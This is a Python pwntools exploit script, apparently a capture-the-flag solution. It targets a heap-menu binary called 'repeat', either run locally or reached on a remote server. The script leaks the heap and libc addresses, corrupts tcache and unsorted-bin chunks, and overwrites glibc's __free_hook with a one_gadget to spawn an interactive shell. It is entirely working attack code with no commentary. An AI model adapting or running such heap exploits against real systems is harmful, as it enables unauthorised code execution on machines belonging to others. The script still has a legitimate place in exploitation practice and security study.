#!/usr/bin/env python
from pwn import *

#context.log_level = 'debug'
context.terminal = ['tmux', 'split', '-h']

local = 1
if local:
    p = process('./repeat')
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    one_gadgets = [0x4f2c5, 0x4f322, 0x10a38c]
else:
    p = remote('172.20.49.112', 9999)
    libc = ELF('./libc-2.27.so')
    one_gadgets = [0x4f365, 0x4f3c2, 0x10a45c]

def repeat(sz, c1, c2):
    p.recvuntil('Size: ')
    p.sendline(str(sz))
    p.recvuntil('Content: ')
    p.send(c1)
    p.recvuntil('Content: ')
    p.send(c2)
    p.recvuntil('Buffer: ')
    b1 = p.recvuntil(', secrect: ', drop=True)
    s1 = p.recvuntil('\n', drop=True)
    p.recvuntil('Buffer: ')
    b2 = p.recvuntil(', secrect: ', drop=True)
    s2 = p.recvuntil('\n', drop=True)
    #gdb.attach(p)
    return b1, s1, b2, s2

# Leak Heap Base
repeat(0x18, 'A'+'\n', 'B'+'\n')
b1, s1, b2, s2 = repeat(0x18, '\n', '\n')
#gdb.attach(p)
heap_base = u64(b1.ljust(8, '\x00')) & 0xFFFFFFFFFFFFF000
info('heap_base = ' + hex(heap_base))

# Leak Libc Base
repeat(0x18, 'A'*24+p64(0x31)+'\n', 'B'+'\n')
repeat(0x18, 'A'+'\n', 'B'+'\n')
repeat(0x28, p64(0)*3+p64(0x21)+p64(heap_base+0x10)+'\n', 'B'+'\n')
#gdb.attach(p)
repeat(0x18, 'A'+'\n', '\x02'+'\x02'+'\x00'*13+'\x07'+'\n')
#repeat(0x38, 'A'+'\n', 'B'+'\n')
#gdb.attach(p)
repeat(0x38, 'A'+'\n', 'B'+'\n')
repeat(0x108-0x40, 'A'+'\n', 'B'+'\n')
repeat(0x38, 'A'+'\n', 'B'+'\n')
repeat(0x38, 'A'*56+p64(0x111)+'\n', 'B'+'\n') # put into unsorted bin
#gdb.attach(p)
repeat(0x28, 'A'+'\n', 'B'*24+p64(0x21)+p64(heap_base+0x330)+p64(0x21)+'\n')
repeat(0x108-0x40, 'A'+'\n', 'B'+'\n')
repeat(0x108-0x40, 'A'*(200-8)+p64(0x110)+p64(0x41)+p64(0)*7+p64(0x61)+'\n', 'B'+'\n')
#gdb.attach(p)
b1, s1, b2, s2 = repeat(0x18, '\n', 'B'*7+'\n') # leak libc
libc_base = u64(b2[8:].ljust(8, '\x00')) - 0x3ebca0
info('libc_base = ' + hex(libc_base))

one_gadget = libc_base + one_gadgets[1]
malloc_hook = libc_base + libc.symbols['__malloc_hook']
free_hook = libc_base + libc.symbols['__free_hook']
# Get Shell
repeat(0x38, 'A'+'\n', 'B'+'\n')
repeat(0x128, 'A'+'\n', 'B'+'\n')
repeat(0x38, 'A'+'\n', 'B'*(0x200-8)+p64(0x131)+p64(free_hook)+'\n')
#gdb.attach(p)
repeat(0x128, '\n', p64(one_gadget)+'\n')
#gdb.attach(p)

p.interactive()



